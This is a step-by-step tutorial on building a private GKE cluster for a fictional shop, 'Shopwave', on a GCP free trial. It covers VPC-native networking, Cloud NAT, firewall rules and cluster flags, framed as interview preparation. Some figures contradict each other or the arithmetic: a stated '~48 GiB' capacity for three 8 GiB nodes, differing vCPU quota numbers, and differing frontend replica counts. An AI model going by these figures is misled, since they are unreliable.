# Shopwave — Enterprise Kubernetes Platform on GKE
### From bare GCP project to production, by hand, with no automation


> ## ⚙️ Build profile: GCP free trial, single pool
> This edition is tuned to run inside a **free-trial quota of 12 vCPU** on project **`kubernetas-console`**, region **`asia-south1`**.
> - **One node pool** (`default-pool`), 3 × `e2-standard-2` (regional) ≈ 6 vCPU, ~2.8 vCPU allocatable. No system/app/spot split.
> - **`pd-standard`** disks (avoids the SSD quota). App services run at **1 replica** (frontend 2); the **`search` StatefulSet is not deployed** (too heavy).
> - **Self-hosted Prometheus**, WORKLOAD logging off, overprovisioning buffer off — all to conserve trial credit.
> - **Delete the cluster when idle** (`gcloud container clusters delete shopwave-prod --region=asia-south1`) so the $300 credit lasts the full 90 days. Everything is in git; recreating is one command + `kubectl apply -f k8s/`.
> - Every place the production design differs, the original (multi-pool, larger) approach is described too — because *knowing what you traded away and why* is itself an interview answer.

**Author's note for the reader:** every manifest in this document is applied manually with `kubectl apply -f`. There is no Helm, no Kustomize, no Terraform for the Kubernetes layer, no shared library, no generator. Every YAML is explicit and block-style. This is deliberate — you cannot explain in an interview what a templating engine wrote for you.

Each section follows the same shape:

> **Concept → Internals (what the control plane actually does) → Full manifest → Verification → The gotcha → The interview answer**

---

## Table of Contents

| Part | Title |
|---|---|
| 0 | Architecture and conventions |
| 1 | GCP foundation — VPC, subnets, NAT, firewall |
| 2 | The cluster and node pools |
| 3 | Namespaces, governance, RBAC, Workload Identity |
| 4 | The application — source code for 10 services |
| 5 | Container images — Dockerfiles and build discipline |
| 6 | Artifact Registry — push, scan, sign, pull |
| 7 | The Pod — internals, probes, lifecycle, termination |
| 8 | Deployments — rollouts, rollbacks, strategies |
| 9 | Services, DNS, EndpointSlices |
| 10 | Ingress, Gateway API, TLS |
| 11 | ConfigMaps, Secrets, Secret Manager CSI |
| 12 | Storage, StatefulSets, PV/PVC, snapshots |
| 13 | Scheduling — affinity, taints, topology, priority |
| 14 | Autoscaling — HPA, VPA, Cluster Autoscaler, PDB |
| 15 | Security — PSS, securityContext, NetworkPolicy |
| 16 | Batch, DaemonSets, and Observability |
| 17 | Day-2 — upgrades, drain, backup, DR |
| 18 | Troubleshooting playbooks |
| 19 | Interview question bank |

---

# Part 0 — Architecture and Conventions

## 0.1 What Shopwave is

Shopwave is an e-commerce platform. It is deliberately chosen because the domain is instantly legible to any interviewer, and because a real shop forces every Kubernetes primitive into the design honestly — you do not have to invent a reason to use a StatefulSet or a DaemonSet.

## 0.2 Service topology

```
                        Internet
                           |
                    [ Cloud Armor ]
                           |
                  [ GCLB / Ingress ]
                           |
                     +-----------+
                     | frontend  |  Deployment, 3 replicas, HPA
                     +-----------+
                           |
        +---------+--------+--------+---------+----------+
        |         |        |        |         |          |
    +-------+ +------+ +-------+ +--------+ +---------+ +-------------+
    |catalog| | cart | |orders | |payments| |inventory| |notifications|
    +-------+ +------+ +-------+ +--------+ +---------+ +-------------+
        |         |        |        |         |               |
        |      +-------+   |        |         |          +---------+
        |      | redis |   |        |         |          | CronJob |
        |      +-------+   |        |         |          +---------+
        |     StatefulSet  |        |         |
        |                  |        |         |
        +------------------+--------+---------+
                           |
                     +----------+          +--------+
                     | postgres |          | search |
                     +----------+          +--------+
                     StatefulSet          StatefulSet
                                          (3 replicas)

    [ log-shipper ] DaemonSet on every node
```

## 0.3 Why each workload type was chosen

| Service | Kind | Justification you give in an interview |
|---|---|---|
| `frontend` | Deployment | Stateless, horizontally scalable, any replica serves any request. Fronted by Ingress. |
| `catalog` | Deployment | Read-heavy, stateless, caches in memory. Scales on RPS. |
| `cart` | Deployment | Stateless *itself* — state lives in Redis. This is the point: statelessness is a property of where you put the data, not of the code. |
| `orders` | Deployment | Writes to Postgres. Needs a PDB because in-flight transactions must not be cut. |
| `payments` | Deployment | PCI-scoped. Restricted PSS, default-deny NetworkPolicy, Workload Identity to Secret Manager, no exec. |
| `inventory` | Deployment | Runs a leader-elected reconciliation loop using a `Lease`. Demonstrates coordination primitives. |
| `notifications` | Deployment + CronJob | Batch workloads on Spot nodes. Job semantics, backoff, TTL. |
| `search` | StatefulSet | Needs stable network identity for cluster discovery, ordered rollout, per-pod PVC. |
| `postgres` | StatefulSet | Stable identity, durable volume, ordered lifecycle, volume expansion, snapshot backup. |
| `redis` | StatefulSet | Stable identity, anti-affinity across zones, init container for config rendering. |
| `log-shipper` | DaemonSet | One per node, reads `/var/log/containers`, needs hostPath, tolerates every taint. |

> **The single best sentence you can say about this diagram:** *"Deployment versus StatefulSet is not about whether the app has data — it's about whether the identity of an individual replica matters. `cart` has data, and it's a Deployment, because the data isn't in the pod."*

## 0.4 Environment and IP plan

| Item | Value |
|---|---|
| GCP project | `kubernetas-console` |
| Region | `asia-south1` (Mumbai) |
| Zones | `asia-south1-a`, `-b`, `-c` |
| VPC | `shopwave-vpc` (custom mode) |
| Node subnet (primary) | `10.40.0.0/20` — 4,096 node IPs |
| Pod range (secondary) | `10.44.0.0/14` — 262,144 pod IPs |
| Service range (secondary) | `10.48.0.0/20` — 4,096 ClusterIPs |
| Control plane | `172.16.0.0/28` (Google-managed VPC, peered) |
| Cluster | `shopwave-prod`, regional, private, Dataplane V2 |
| Registry | `asia-south1-docker.pkg.dev/kubernetas-console/shopwave` |

Namespaces:

| Namespace | PSS enforce | Purpose |
|---|---|---|
| `shopwave-dev` | `baseline` | Development |
| `shopwave-staging` | `baseline` | Pre-prod, mirrors prod |
| `shopwave-prod` | `baseline`, warn `restricted` | Production |
| `platform` | `privileged` | Ingress controllers, cert-manager, CSI |
| `monitoring` | `privileged` | Prometheus, Grafana, Alertmanager |

## 0.5 Repository layout

You will build exactly this tree. Numbered directories are not decoration — `kubectl apply -f dir/` walks files in lexical order, and ordering is a real dependency (Namespace before Quota, CRD before CR, SA before Deployment).

```
shopwave/
├── app/                          # application source
│   ├── frontend/
│   ├── catalog/
│   ├── cart/
│   ├── orders/
│   ├── payments/
│   ├── inventory/
│   └── notifications/
└── k8s/
    ├── 00-namespaces/
    ├── 01-governance/            # ResourceQuota, LimitRange
    ├── 02-rbac/                  # Roles, RoleBindings
    ├── 03-identity/              # ServiceAccounts, Workload Identity
    ├── 04-config/                # ConfigMaps
    ├── 05-secrets/               # Secrets, SecretProviderClass
    ├── 06-storage/               # StorageClass, PVC, VolumeSnapshotClass
    ├── 07-stateful/              # postgres, redis, search
    ├── 08-workloads/             # the 7 application Deployments
    ├── 09-services/              # Services
    ├── 10-ingress/               # Ingress, Gateway, certs
    ├── 11-scheduling/            # PriorityClass
    ├── 12-autoscaling/           # HPA, VPA, PDB
    ├── 13-security/              # NetworkPolicy
    ├── 14-batch/                 # Jobs, CronJobs
    ├── 15-daemonset/             # log-shipper
    └── 16-observability/         # Prometheus stack
```

## 0.6 Conventions used in every manifest

Every object carries the **recommended Kubernetes labels**. This is not cosmetic — it is how `kubectl get -l`, Prometheus relabelling, cost allocation and incident triage all work.

```yaml
metadata:
  labels:
    app.kubernetes.io/name: orders
    app.kubernetes.io/instance: orders-prod
    app.kubernetes.io/version: "1.4.0"
    app.kubernetes.io/component: backend
    app.kubernetes.io/part-of: shopwave
    app.kubernetes.io/managed-by: kubectl
```

> **Gotcha:** a Deployment's `spec.selector.matchLabels` is **immutable**. If you put `app.kubernetes.io/version` in the selector, you can never change the version without deleting the Deployment. **Selectors get the minimum stable identity; everything else goes in labels only.** Our selectors use only `app.kubernetes.io/name` + `app.kubernetes.io/instance`.

## 0.7 Prerequisites

```bash
gcloud version          # >= 470
kubectl version --client # >= 1.29
docker version           # or podman
```

Because of corporate TLS-inspection proxies, **run everything from a bastion VM inside the VPC over IAP**, not from a laptop. It removes an entire class of `x509: certificate signed by unknown authority` failures.

```bash
gcloud compute instances create shopwave-bastion \
  --zone=asia-south1-a \
  --machine-type=e2-medium \
  --subnet=shopwave-subnet-asia-south1 \
  --no-address \
  --tags=bastion \
  --image-family=debian-12 \
  --image-project=debian-cloud \
  --scopes=cloud-platform

gcloud compute ssh shopwave-bastion --zone=asia-south1-a --tunnel-through-iap
```

`--no-address` = no public IP. IAP tunnels the SSH session. This is how real enterprises reach private infrastructure.


---

# Part 1 — GCP Foundation

This is the layer tutorials skip and interviews probe. Pod IP exhaustion, private-cluster image-pull failures and NAT port exhaustion all trace back to decisions made here.

## 1.1 Variables

```bash
export PROJECT_ID=kubernetas-console
export REGION=asia-south1
export NETWORK=shopwave-vpc
export SUBNET=shopwave-subnet-asia-south1
export ROUTER=shopwave-router
export NAT=shopwave-nat

gcloud config set project $PROJECT_ID
gcloud config set compute/region $REGION
```

## 1.2 Enable APIs

```bash
gcloud services enable \
  container.googleapis.com \
  compute.googleapis.com \
  iam.googleapis.com \
  secretmanager.googleapis.com \
  artifactregistry.googleapis.com \
  containeranalysis.googleapis.com \
  binaryauthorization.googleapis.com \
  logging.googleapis.com \
  monitoring.googleapis.com \
  cloudresourcemanager.googleapis.com
```

## 1.3 VPC — custom mode, always

```bash
gcloud compute networks create $NETWORK \
  --subnet-mode=custom \
  --bgp-routing-mode=regional
```

**Why custom, not auto.** Auto-mode creates a subnet in *every* region using a fixed `10.128.0.0/9` scheme you do not control. Enterprises have on-prem CIDRs, partner VPCs and peering; overlapping ranges make peering permanently impossible, and you cannot un-overlap without rebuilding the VPC. Custom mode with IPAM-allocated ranges is the only defensible choice.

**`--bgp-routing-mode=regional` vs `global`.** Regional means a Cloud Router only advertises routes for subnets in its own region. Global advertises everything everywhere. Regional is the safer default: it contains the blast radius of a bad route advertisement to one region. You switch to global only when you have genuine cross-region on-prem reachability requirements.

> **Interview answer:** *"Auto-mode VPCs are a day-1 convenience and a day-500 liability. We ran custom mode because in a VPC-native cluster pod CIDRs are real, routable VPC addresses that traverse peering — so pod IP planning is a network-architecture decision, not a Kubernetes one."*

## 1.4 Subnet with secondary ranges — the heart of VPC-native

```bash
gcloud compute networks subnets create $SUBNET \
  --network=$NETWORK \
  --region=$REGION \
  --range=10.40.0.0/20 \
  --secondary-range=shopwave-pods=10.44.0.0/14 \
  --secondary-range=shopwave-services=10.48.0.0/20 \
  --enable-private-ip-google-access \
  --enable-flow-logs \
  --logging-aggregation-interval=interval-5-sec \
  --logging-flow-sampling=0.5 \
  --logging-metadata=include-all
```

### The three ranges

| Range | CIDR | Size | Consumed by |
|---|---|---|---|
| Primary | `10.40.0.0/20` | 4,096 | **Node** internal IPs |
| Secondary `shopwave-pods` | `10.44.0.0/14` | 262,144 | **Pod** IPs — alias IPs on the node NIC |
| Secondary `shopwave-services` | `10.48.0.0/20` | 4,096 | **ClusterIP** Services — virtual, never on a NIC |

### Internals: what "VPC-native" actually means

In a VPC-native cluster there is **no overlay**. No VXLAN, no IP-in-IP, no encapsulation, no route-based hack.

GKE assigns each node an **alias IP range** — a slice of the pods secondary range, `/24` by default — attached to the node's network interface. The VPC control plane itself knows that `10.44.3.0/24` lives on node-X. When a pod on node-A sends a packet to a pod on node-B:

1. The packet leaves with source = pod-A's IP, destination = pod-B's IP. Both are **real VPC addresses**.
2. The Andromeda VPC fabric routes it natively. No NAT, no tunnel header, no MTU reduction.
3. VPC firewall rules can match on **pod IPs directly**.
4. Cloud Logging flow logs record the pod IPs.

Compare with the legacy **routes-based** cluster: GKE created a custom static route per node in the VPC route table. GCP caps routes per VPC (~200 by default), which capped cluster size, and route programming was slow and racy on node churn. VPC-native replaced it and is the default. Alias IPs are also why GKE can hand a pod IP directly to a Google load balancer in **container-native load balancing** (NEGs) — the LB targets the pod, skipping the node hop and `kube-proxy` entirely.

### Sizing the pod range — the calculation that gets asked

GKE allocates a **fixed alias block per node**, sized by `--max-pods-per-node`, rounded up to a power of two, and it allocates roughly **double** the max pods to reduce IP reuse races on pod churn:

| `max-pods-per-node` | Alias block per node | IPs consumed |
|---|---|---|
| 110 (default) | `/24` | 256 |
| 64 | `/25` | 128 |
| 32 | `/26` | 64 |
| 16 | `/27` | 32 |
| 8 | `/28` | 16 |

So: **max nodes = (pod range size) ÷ (per-node block)**.

- `/14` = 262,144 IPs ÷ 256 = **1,024 nodes**
- `/20` = 4,096 ÷ 256 = **16 nodes**

> **The gotcha that ends careers.** The pods secondary range is effectively **immutable after cluster creation**. If you had sized it `/20`, your cluster caps at 16 nodes no matter how much CPU quota you have. The Cluster Autoscaler will fail silently-ish with `IP space exhausted` or `not enough free IP addresses`, and the symptom is "pods Pending, autoscaler not scaling, quota is fine". Half of all real GKE scaling incidents are this. Size it once, size it big — IPs in a private RFC1918 range are free.

### `--enable-private-ip-google-access`

Nodes have **no external IPs**. Without this flag they cannot reach `gcr.io`, `pkg.dev`, Cloud Logging, Cloud Monitoring or Secret Manager. Every image pull hangs and then fails with a timeout. This single flag is the most common private-cluster bug on the planet.

What it actually does: enables routing to Google's `199.36.153.8/30` (`private.googleapis.com`) and public Google API front-ends **from private IPs, without traversing the internet**. It covers Google APIs only — not Docker Hub, not PyPI, not Stripe. Those need NAT.

### Flow logs

50% sampling with `include-all` metadata. This is your forensic record for *"which pod talked to payments at 02:14"*. Mentioning that you chose a **sampling rate** rather than 100% shows cost awareness — flow logs at full rate on a busy cluster are genuinely expensive.

## 1.5 Cloud NAT — egress for private nodes

```bash
gcloud compute routers create $ROUTER \
  --network=$NETWORK \
  --region=$REGION

gcloud compute routers nats create $NAT \
  --router=$ROUTER \
  --region=$REGION \
  --nat-all-subnet-ip-ranges \
  --auto-allocate-nat-external-ips \
  --enable-logging \
  --log-filter=ERRORS_ONLY \
  --min-ports-per-vm=128 \
  --enable-dynamic-port-allocation \
  --max-ports-per-vm=2048 \
  --tcp-established-idle-timeout=1200s \
  --tcp-transitory-idle-timeout=30s
```

### Why every flag is there

**`--nat-all-subnet-ip-ranges` is load-bearing.** It includes the **secondary** ranges. Omit it and your *nodes* have internet egress while every *pod* times out — because pod IPs come from the secondary range and would not be NATed. This is a brutal, classic bug: `apt` works when you SSH to the node, and the pod on it cannot resolve anything.

**Port exhaustion — the senior-level answer.** Cloud NAT allocates a **fixed block of source ports per VM**, not per connection. Default is 64. A NAT IP has 64,512 usable ports. Each *unique* (dest IP, dest port) tuple consumes a source port.

A node running 60 pods, each holding 20 connections to the Stripe API, needs 1,200 ports. With 64 allocated, you get `NAT allocation failed` — which surfaces to the application as **intermittent, unexplainable connection resets under load only**. It looks like a flaky third party. It is not.

- `--min-ports-per-vm=128` — floor.
- `--enable-dynamic-port-allocation` + `--max-ports-per-vm=2048` — NAT scales the block up on demand instead of you over-provisioning statically.
- `--tcp-established-idle-timeout=1200s` — lowering this reclaims ports faster but can silently kill long-lived idle connections (database pools, gRPC streams). It is a real trade-off, and saying so out loud is what separates a senior from a mid.

**Capacity maths worth knowing:** 1 NAT IP × 64,512 ports ÷ 2,048 max-ports-per-VM = **31 VMs per NAT IP**. `--auto-allocate-nat-external-ips` lets GCP add IPs as you grow; in a regulated enterprise you instead **reserve static IPs** so partners can allowlist your egress.

## 1.6 Firewall rules

GKE auto-creates the rules its own components need. Enterprises add explicit posture on top.

```bash
# 1. Health checks from Google's LB prober ranges — REQUIRED for Ingress
gcloud compute firewall-rules create shopwave-allow-health-checks \
  --network=$NETWORK \
  --direction=INGRESS \
  --action=ALLOW \
  --source-ranges=35.191.0.0/16,130.211.0.0/22 \
  --rules=tcp \
  --priority=1000

# 2. IAP TCP forwarding for SSH — no 0.0.0.0/0 SSH, ever
gcloud compute firewall-rules create shopwave-allow-iap-ssh \
  --network=$NETWORK \
  --direction=INGRESS \
  --action=ALLOW \
  --source-ranges=35.235.240.0/20 \
  --rules=tcp:22 \
  --target-tags=bastion \
  --priority=1000

# 3. Internal traffic within the VPC
gcloud compute firewall-rules create shopwave-allow-internal \
  --network=$NETWORK \
  --direction=INGRESS \
  --action=ALLOW \
  --source-ranges=10.40.0.0/20,10.44.0.0/14 \
  --rules=tcp,udp,icmp \
  --priority=1000

# 4. Explicit deny-all ingress at the lowest usable priority
gcloud compute firewall-rules create shopwave-deny-all-ingress \
  --network=$NETWORK \
  --direction=INGRESS \
  --action=DENY \
  --source-ranges=0.0.0.0/0 \
  --rules=all \
  --priority=65534 \
  --enable-logging
```

### The magic ranges you must memorise

| Range | What it is | What breaks without it |
|---|---|---|
| `35.191.0.0/16`, `130.211.0.0/22` | Google LB **health-check probers** | Ingress backends stuck `UNHEALTHY` forever while pods are perfectly healthy. Top-3 GKE Ingress bug. |
| `35.235.240.0/20` | **IAP** TCP forwarding | SSH to private VMs fails. You have hit this before. |
| `172.16.0.0/28` | Your **control plane** | Webhooks (cert-manager, admission controllers) time out — the master must reach port 8443/9443 on nodes. |

### The admission-webhook firewall trap

GKE's auto-created rule only opens **ports 443 and 10250** from the control plane to nodes. Any admission webhook listening on a *different* port (cert-manager uses 9443, many operators use 8443) will **time out** — and because webhooks default to `failurePolicy: Fail`, **the whole API server starts rejecting object creation**. Cluster looks dead. Fix:

```bash
gcloud compute firewall-rules create shopwave-allow-master-webhooks \
  --network=$NETWORK \
  --direction=INGRESS \
  --action=ALLOW \
  --source-ranges=172.16.0.0/28 \
  --rules=tcp:8443,tcp:9443,tcp:15017 \
  --target-tags=gke-shopwave-prod \
  --priority=1000
```

This is a top-tier "tell me about a hard GKE bug" story. Most engineers have never heard of it.

### VPC firewall vs NetworkPolicy — the distinction interviewers want

| | VPC firewall | NetworkPolicy |
|---|---|---|
| Enforced by | GCP Andromeda fabric, outside the node | Cilium/eBPF (DPv2) inside the node |
| Selects on | IP ranges, network tags, service accounts | **Pod labels, namespace labels** |
| Aware of pods | Only as IPs | Fully — it's the native unit |
| Survives pod IP churn | No — IPs change constantly | Yes — labels are stable |
| Layer | Infrastructure | Application/workload |

You need both. VPC firewall is your perimeter; NetworkPolicy is your internal segmentation. Neither substitutes for the other.

## 1.7 Verify before moving on

```bash
gcloud compute networks subnets describe $SUBNET --region=$REGION \
  --format="yaml(ipCidrRange,secondaryIpRanges,privateIpGoogleAccess)"

gcloud compute routers nats describe $NAT --router=$ROUTER --region=$REGION

gcloud compute firewall-rules list --filter="network=$NETWORK" \
  --format="table(name,direction,priority,sourceRanges.list(),allowed[].map().firewall_rule().list())"
```

Expected: primary range present, **both** named secondary ranges present, `privateIpGoogleAccess: true`.

## 1.8 Part 1 interview talking points

- Routes-based vs VPC-native clusters; why alias IPs won; the route-quota ceiling
- Sizing a pod CIDR from a node-count target, and the per-node block table
- Private Google Access ≠ Cloud NAT — one is Google APIs, one is the internet
- Cloud NAT port allocation and exhaustion as a production failure mode
- Why LB health-check ranges must be explicitly allowed
- The control-plane-to-node webhook port trap on private clusters
- VPC firewall vs NetworkPolicy: IP-based perimeter vs label-based segmentation


---

# Part 2 — The Cluster (single default pool, free tier)

> **This build targets the GCP free trial.** The trial gives you a limited vCPU quota (commonly ~8 vCPU in a region) and a fixed credit. So we run **one node pool — `default-pool`** — and everything schedules onto it. The multi-pool design (system / app / spot separation) is the correct production pattern and is described at the end of this Part as *what you would do with real quota*, because that distinction is itself an interview answer.

## 2.1 Variables

```bash
export CLUSTER=shopwave-prod
export MASTER_CIDR=172.16.0.0/28
export MY_IP=$(curl -s ifconfig.me)/32
```

## 2.2 Create the cluster — one pool

```bash
gcloud container clusters create $CLUSTER \
  --region=$REGION \
  --network=$NETWORK \
  --subnetwork=$SUBNET \
  --enable-ip-alias \
  --cluster-secondary-range-name=shopwave-pods \
  --services-secondary-range-name=shopwave-services \
  --enable-private-nodes \
  --master-ipv4-cidr=$MASTER_CIDR \
  --enable-master-authorized-networks \
  --master-authorized-networks=$MY_IP \
  --enable-dataplane-v2 \
  --workload-pool=$PROJECT_ID.svc.id.goog \
  --enable-shielded-nodes \
  --shielded-secure-boot \
  --shielded-integrity-monitoring \
  --release-channel=regular \
  --enable-autoupgrade \
  --enable-autorepair \
  --maintenance-window-start="2026-07-20T18:30:00Z" \
  --maintenance-window-end="2026-07-20T22:30:00Z" \
  --maintenance-window-recurrence="FREQ=WEEKLY;BYDAY=SA,SU" \
  --logging=SYSTEM \
  --monitoring=SYSTEM \
  --num-nodes=1 \
  --machine-type=e2-standard-2 \
  --disk-type=pd-standard \
  --disk-size=50 \
  --node-locations=asia-south1-a,asia-south1-b,asia-south1-c \
  --enable-autoscaling --min-nodes=1 --max-nodes=2 \
  --location-policy=BALANCED \
  --max-pods-per-node=32 \
  --addons=HorizontalPodAutoscaling,HttpLoadBalancing,GcePersistentDiskCsiDriver \
  --workload-metadata=GKE_METADATA \
  --labels=env=prod,platform=shopwave \
  --async
```

### The free-tier-specific choices

**`--num-nodes=1` is per zone → 3 nodes.** With a regional cluster and 3 zones, `--num-nodes=1` creates **3 nodes**, one per zone. At `e2-standard-2` that's **3 × 2 = 6 vCPU / ~48 GiB capacity** — but *allocatable* is far less (see 2.5). This fits an 8-vCPU trial quota with a little headroom.

> **If even 6 vCPU is too much for your quota**, go zonal and single-node:
> ```bash
> # replace the two lines above with:
>   --zone=asia-south1-a \
>   --num-nodes=1 \
> ```
> and drop `--region`/`--node-locations`. You lose the multi-zone HA story and the regional control plane, but you fit in ~2 vCPU. **State the trade-off if asked:** a zonal cluster has one control-plane replica and no zone redundancy — fine for learning, never for production.

**`--enable-autoscaling --min-nodes=1 --max-nodes=2`** — the autoscaler is set **on the default pool directly** at creation. On the trial you cannot afford runaway scale-up, so the ceiling is 2 nodes per zone (max 6 nodes total). Even this may exceed quota during a scale event; watch it.

**`--machine-type=e2-standard-2`** — 2 vCPU / 8 GiB. Small, cheap, enough for the trimmed workloads in this build. `e2-medium` (2 vCPU / 4 GiB **shared-core**) is even cheaper but the shared-core CPU makes probes flaky under load — avoid it for anything with real traffic.

**`--disk-type=pd-standard`** — spinning-disk-priced persistent disk, cheapest option. Production would use `pd-balanced` or `pd-ssd`; on the trial, `pd-standard` saves credit and the latency doesn't matter for a demo.

**`--max-pods-per-node=32`** — drops the per-node alias block from a `/24` (256 IPs) to a `/26` (64 IPs). On a tiny cluster you'll never run 110 pods on a node, and the smaller block is tidier. (It's set at creation and immutable per pool, so choose it now.)

**`--logging=SYSTEM --monitoring=SYSTEM`** — **note WORKLOAD logging is off.** Workload log ingestion is the expensive part of Cloud Logging and it burns trial credit fast. We ship our own app logs via the log-shipper DaemonSet (Part 16) and keep only system logs in Cloud Logging. On the trial this matters.

**No `--enable-managed-prometheus`** — Managed Prometheus bills per sample and eats credit. On the trial we run the self-hosted Prometheus from Part 16 instead. (In production you'd likely flip this the other way.)

Everything else — private nodes, Dataplane V2, Workload Identity, shielded nodes, release channel, maintenance window — is **unchanged from the production design**, because those cost nothing extra and dropping them would teach you the wrong habits.

## 2.3 The flags that matter (unchanged from production)

### `--region` not `--zone`

A **regional cluster** runs **3 control-plane replicas across 3 zones** behind one endpoint, at no extra charge. A zonal cluster has one control plane; during a GKE master upgrade or a zonal outage your API server is simply gone. Workloads keep running — kubelets have cached state — but you get **no scaling, no rollouts, no `kubectl`, no HPA, no scheduling of new pods**. On the free trial the regional control plane is still free, so keep it unless you're fighting vCPU quota, in which case zonal is the pragmatic compromise.

> **Interview nuance:** "regional" describes both the **control plane** (3 replicas) and the **node distribution** (`--node-locations`). They're separate concerns — you can have a regional control plane with nodes in one zone, and it's a bad idea.

### `--enable-private-nodes` + `--master-ipv4-cidr`

Nodes get **no external IPs**. The control plane lives in a **Google-managed VPC**, connected to yours by **VPC peering**. That `/28` is the master's subnet inside Google's project.

Facts that get asked:
- The `/28` is **immutable** and must never overlap anything you own or will peer with.
- It's a `/28` because that's exactly enough for 3 masters + peering infrastructure.
- Peering is **non-transitive** — which is why a private cluster's master cannot reach a resource in a *third* VPC peered to yours.

### `--enable-master-authorized-networks`

Restricts which CIDRs can even open a TCP connection to the API endpoint. Defence in depth: authorized networks is *network reachability*, RBAC is *identity and authorisation* — orthogonal, you need both.

> **This flag will bite you.** Your IP is dynamic. When `kubectl` starts hanging tomorrow:
> ```bash
> gcloud container clusters update $CLUSTER --region=$REGION \
>   --master-authorized-networks=$(curl -s ifconfig.me)/32
> ```
> Better: work from the bastion inside the VPC over IAP (Part 0). Given corporate TLS-inspection proxies, this also removes an entire class of x509 failures.

### `--enable-dataplane-v2`

Replaces `kube-proxy` + iptables with **Cilium/eBPF**.

**Internals.** Classic `kube-proxy` writes a chain of rules per Service and per endpoint, traversed **sequentially**; at 5,000 Services × 10 endpoints that's ~100,000 rules evaluated linearly per packet, and **any** Service change triggers a full `iptables-restore` — O(n) convergence that can take seconds on a busy cluster, i.e. user-visible 5xx during rollouts. eBPF uses kernel **hash maps**: O(1) service lookup, one-entry updates on endpoint changes. You also get **native NetworkPolicy** (no Calico add-on) and **policy deny-logging**.

**Trade-offs to volunteer:** DPv2 is **immutable per cluster**, drops some Calico CRDs, and has subtly different NetworkPolicy semantics in a few corner cases.

### `--enable-shielded-nodes --shielded-secure-boot --shielded-integrity-monitoring`

Secure Boot refuses unsigned kernel modules (blocks rootkits); integrity monitoring measures boot state into a vTPM and alerts on drift.

> **Gotcha:** Secure Boot **breaks unsigned kernel modules** — a later GPU driver or third-party eBPF agent that ships unsigned won't load, and the failure is at boot with an unhelpful message.

### `--release-channel=regular`

| Channel | Lag | Use |
|---|---|---|
| `rapid` | Days behind upstream | Test clusters |
| `regular` | ~2–3 months | **Production default** |
| `stable` | ~4–6 months | Risk-averse, regulated |

Choosing a channel means you **can't pin an exact version** — and that's the point: it forces you to build for continuous upgrade (PDBs, graceful termination, no single-replica services) rather than accumulating a stale cluster.

### Maintenance window

`18:30 UTC` = midnight IST, weekend nights. Auto-upgrade is on; the window controls *when*. For a peak event use a **maintenance exclusion** (capped at 30 days for minor upgrades — GKE won't let you freeze forever):

```bash
gcloud container clusters update $CLUSTER --region=$REGION \
  --add-maintenance-exclusion-name=diwali-freeze \
  --add-maintenance-exclusion-start=2026-10-15T00:00:00Z \
  --add-maintenance-exclusion-end=2026-11-05T00:00:00Z \
  --add-maintenance-exclusion-scope=no_minor_or_node_upgrades
```

### `--workload-metadata=GKE_METADATA`

Enforces Workload Identity on the pool and runs the GKE metadata server as a DaemonSet that **intercepts `169.254.169.254`**, blocking pods from reading the raw GCE metadata endpoint.

> Without it, **any pod** can `curl` the metadata server and get the **node's** service account token — the classic GKE privilege-escalation path. It's also why the node SA must be least-privilege (Part 6), never the default Compute Engine SA which has `roles/editor` on the whole project.

## 2.4 Get credentials

```bash
gcloud container clusters get-credentials $CLUSTER --region=$REGION
kubectl get nodes -o wide
kubectl cluster-info
```

Nodes show **no EXTERNAL-IP** — private cluster confirmed. You should see **3 nodes**, one per zone.

> **How auth works here.** `get-credentials` writes a kubeconfig with `exec` credentials pointing at `gke-gcloud-auth-plugin`. Since client-go 1.26 the in-tree GCP auth provider is **removed** — if you get `no Auth Provider found for name "gcp"`, install `gke-gcloud-auth-plugin` and set `USE_GKE_GCLOUD_AUTH_PLUGIN=True`. A very common upgrade-day failure.

## 2.5 No taints, no extra pools — and why that's fine here

Because there is **one pool and no taints**, every pod schedules anywhere, including the `kube-system` pods and your apps sharing nodes. On the trial this is acceptable; you're not running untrusted tenants and blast-radius isolation is a luxury you're trading for cost.

**What you are giving up, stated honestly (this is the interview answer):**

- **No blast-radius isolation.** If `search` OOMs a node, it can take CoreDNS or Prometheus with it, because they're on the same nodes.
- **No cost tiering.** Everything runs on standard on-demand nodes; there's no Spot pool for batch, so `notifications` and the digest job pay full price (but they're tiny here).
- **No hardware shaping.** One machine type for everything.

The manifests in later Parts are therefore adjusted:
- **`nodeSelector: {pool: ...}` is removed everywhere** — there's only one pool.
- **Spot tolerations are removed** from `notifications` and the digest CronJob.
- **The system-pool taint tolerations are removed** from Prometheus / Grafana / Alertmanager.
- **`topologySpreadConstraints` on zone are KEPT** — you still have 3 zones, so zonal spread is still real and worth it.
- **Pod anti-affinity on hostname is KEPT** — still meaningful across 3 nodes. (But note: with only 3 nodes, any workload with **required** hostname anti-affinity caps at **3 replicas** — see Part 13.)

## 2.6 Inspect a node — Capacity vs Allocatable

```bash
kubectl describe node <node> | grep -A12 "Allocatable"
```

> **Capacity vs Allocatable — always asked, and it stings on small nodes.** An `e2-standard-2` has 2 vCPU / 8 GiB **Capacity**, but **Allocatable** is only ~**0.94 CPU / ~5.9 GiB** after kube-reserved, system-reserved, and the eviction threshold. On a 2-vCPU node GKE reserves proportionally *more*, so you keep less than half the CPU. **The scheduler only ever considers Allocatable.** This is exactly why the workload requests in this build are so small — three of these nodes give you roughly **2.8 vCPU / 17 GiB allocatable total**, and the whole platform has to fit inside that.

## 2.7 The production design (what you'd do with real quota)

For the interview, know what this build *omits* and why:

- **Three node pools** — a tainted **system pool** (`dedicated=system:NoSchedule`) for CoreDNS/Prometheus/ingress; an autoscaling **app pool** (1–4) for stateless services; a scale-from-zero **spot pool** (0–6, `cloud.google.com/gke-spot=true:NoSchedule`) for batch.
- **Three reasons for pool separation:** blast radius (the big one), cost (Spot is 60–91% cheaper), hardware shape (GPU / high-mem / Arm).
- **Scale-from-zero** — `--num-nodes=0` + the taint declared **on the pool template**, because the Cluster Autoscaler simulates scheduling against the *template*; a taint applied afterward with `kubectl taint` isn't in the template, so the simulation is wrong and pods don't schedule. Same for `--node-labels` vs `kubectl label`.
- **Surge upgrades** — `--max-surge-upgrade=1 --max-unavailable-upgrade=0` so capacity never dips during a node upgrade (costs one surge node — which the free tier can't spare, another reason it's omitted here).

Being able to say *"on the trial I run one pool and here is precisely what isolation and cost-tiering I gave up, and here is the three-pool design I'd use in production and why"* is a stronger answer than either design alone.

## 2.8 Part 2 interview talking points

- Regional vs zonal control plane; exactly what breaks when the master is down (and what doesn't)
- Private cluster: where the control plane lives, VPC peering, non-transitivity, the immutable `/28`
- Master authorized networks vs RBAC — reachability vs identity
- Dataplane V2: iptables O(n) sequential traversal + full-table rewrites vs eBPF O(1) hash maps; what you give up
